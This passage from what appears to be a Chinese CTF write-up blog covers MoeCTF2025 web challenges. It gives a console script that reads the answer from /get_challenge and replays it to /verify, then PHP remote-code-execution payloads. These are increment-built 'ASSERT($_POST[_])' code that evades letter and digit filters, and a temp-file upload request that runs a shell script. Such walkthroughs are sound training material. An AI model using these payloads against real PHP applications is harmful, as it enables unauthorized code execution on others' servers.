<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getProgressBarText</span>(<span class="params">style</span>) &#123;</span><br><span class="line">     <span class="keyword">switch</span> (style) &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&quot;&gt;&gt;&gt; 等待开始挑战...&quot;</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&quot;&gt;&gt;&gt; 防破译进程加载中...&quot;</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&quot;&gt;&gt;&gt; 正在骇入系统...&quot;</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&quot;&gt;&gt;&gt; 挑战超时&quot;</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">             <span class="keyword">return</span> <span class="string">`&gt;&gt;&gt; 挑战已终止，正确密码 <span class="subst">$&#123;realCode.join(<span class="string">&quot;&quot;</span>)&#125;</span>`</span>;</span><br><span class="line">         <span class="attr">default</span>:</span><br><span class="line">             <span class="title function_">fetch</span>(<span class="string">&quot;/verify&quot;</span>, &#123;</span><br><span class="line">                 <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                 <span class="attr">headers</span>: &#123;</span><br><span class="line">                     <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">                 &#125;,</span><br><span class="line">                 <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">                     <span class="attr">answers</span>: realCode,</span><br><span class="line">                     <span class="attr">token</span>: myToken</span><br><span class="line">                 &#125;)</span><br><span class="line">             &#125;)</span><br><span class="line">                 .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">                 .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">                     <span class="keyword">if</span> (data.<span class="property">correct</span>) &#123;</span><br><span class="line">                         <span class="keyword">const</span> flag = data.<span class="property">flag</span> || <span class="string">&quot;无法获取flag&quot;</span>;</span><br><span class="line">                         $(<span class="string">&quot;.computerTitle&quot;</span>).<span class="title function_">text</span>(<span class="string">`破译完成，已获取如下权限: <span class="subst">$&#123;flag&#125;</span>`</span>);</span><br><span class="line">                     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                         $(<span class="string">&quot;.computerTitle&quot;</span>).<span class="title function_">text</span>(<span class="string">`破译失败: <span class="subst">$&#123;data.message || <span class="string">&quot;未知错误&quot;</span>&#125;</span>`</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;)</span><br><span class="line">                 .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                     <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error verifying solution:&quot;</span>, error);</span><br><span class="line">                     $(<span class="string">&quot;.computerTitle&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;破译完成，但无法获取权限内容&quot;</span>);</span><br><span class="line">                 &#125;);</span><br><span class="line">             $(<span class="string">&quot;.decode-item-block&quot;</span>).<span class="title function_">show</span>();</span><br><span class="line">             $(<span class="string">&quot;.leftPanel,.inputPanel&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">             <span class="keyword">return</span> (</span><br><span class="line">                 <span class="string">&quot;&gt;&gt;&gt; 骇入成功&quot;</span> +</span><br><span class="line">                 (limitChallenge ? <span class="string">`，挑战用时：<span class="subst">$&#123;passedTime&#125;</span> 秒`</span> : <span class="string">&quot;&quot;</span>)</span><br><span class="line">             );</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>向&#x2F;verify路由发送POST请求，请求体是一个JSON表单，包括正确答案realCode和token，如果data.correct是true就会返回true</p>
<p>然后看到这个函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateRandomDigitArray</span>(<span class="params">length</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">`/get_challenge?count=<span class="subst">$&#123;length&#125;</span>`</span>)</span><br><span class="line">                .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`HTTP error! status: <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span> (data.<span class="property">error</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(data.<span class="property">error</span>);</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">const</span> real = data.<span class="property">numbers</span>;</span><br><span class="line">                    <span class="keyword">const</span> guess = <span class="title class_">Array</span>.<span class="title function_">from</span>(&#123; length &#125;, <span class="function">() =&gt;</span> <span class="literal">null</span>);</span><br><span class="line">                    myToken = data.<span class="property">token</span>; <span class="comment">// 保存 token 到 myToken</span></span><br><span class="line">                    <span class="title function_">resolve</span>(&#123; real, guess &#125;);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error fetching challenge data:&quot;</span>, error);</span><br><span class="line">                  <span class="title function_">reject</span>(<span class="string">&quot;Failed to fetch challenge data.&quot;</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>向&#x2F;get_challenge发送GET请求，并返回响应，里面包含我们的真实答案real，以及玩家的输入、token等。</p>
<p>那我们直接向&#x2F;get_challenge发送GET请求拿到data，然后将data当成请求表单向&#x2F;verify路由发送POST请求并输出flag</p>
<p>控制台POC</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_">async</span>() =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> count = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title function_">await</span>(<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/get_challenge?count=<span class="subst">$&#123;count&#125;</span>`</span>)).<span class="title function_">json</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回数据：&quot;</span>,data);</span><br><span class="line">        <span class="keyword">const</span> &#123;numbers, token&#125; = data;</span><br><span class="line">        <span class="keyword">const</span> data2 = <span class="title function_">await</span>(<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/verify&#x27;</span>,&#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">                answers : numbers,</span><br><span class="line">                token : token</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)).<span class="title function_">json</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data2.<span class="property">flag</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求出错&quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250925143531045.png" alt="image-20250925143531045"></p>
<h2 id="这是…Webshell？"><a href="#这是…Webshell？" class="headerlink" title="这是…Webshell？"></a><strong>这是…Webshell？</strong></h2><h3 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="#无数字字母RCE"></a>#无数字字母RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很明显了，无数字字母RCE，参考我文章<a href="https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%9F%BA%E7%A1%80">https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%9F%BA%E7%A1%80</a></p>
<p>先构造个<code>phpinfo()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27; &#x27;</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>();</span><br></pre></td></tr></table></figure>

<p>发现是5.6.40，那就直接打<code>ASSERT($_POST[_])</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造ASSERT($_POST[_]);</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//$_变成Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27; &#x27;</span>];<span class="comment">//利用布尔表达式返回[0]然后取出第一个字符A</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//存储A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//操作A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为AS</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//初始化为A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造E</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASSE</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASSER</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASSERT</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="comment">//构造下划线</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//初始化为A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_p</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//初始化为A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_PO</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_POS</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="comment">//构造T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_POST</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="comment">//存储为$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);<span class="comment">//ASSERT($_POST[_])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP5中，是不支持<code>($a)()</code>这种调用方法的，所以异或和取反这些可能打不通</p>
<h2 id="这是…Webshell-revenge"><a href="#这是…Webshell-revenge" class="headerlink" title="这是…Webshell?_revenge"></a><strong>这是…Webshell?_revenge</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error: shell length exceeded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]/&quot;</span>, <span class="variable">$shell</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error: shell not allowed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是低版本的php，这次把自增过滤了，那就只能用p牛讲过的临时文件上传了，这个我文章里也写过<a href="https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%86%B2%E7%A0%B4%E9%99%90%E5%88%B6">https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%86%B2%E7%A0%B4%E9%99%90%E5%88%B6</a></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?shell=?&gt;&lt;?=`.%20/???/????????[@-[]`;?&gt;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:10596</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>291</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;139&quot;, &quot;Not;A=Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryQedal20qSazBFA6b</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryQedal20qSazBFA6b</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">#!/bin/sh</span></span><br><span class="line"><span class="language-pgsql">ls</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryQedal20qSazBFA6b</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryQedal20qSazBFA6b--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250925150709664.png" alt="image-20250925150709664"></p>
<p>终于做完了</p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
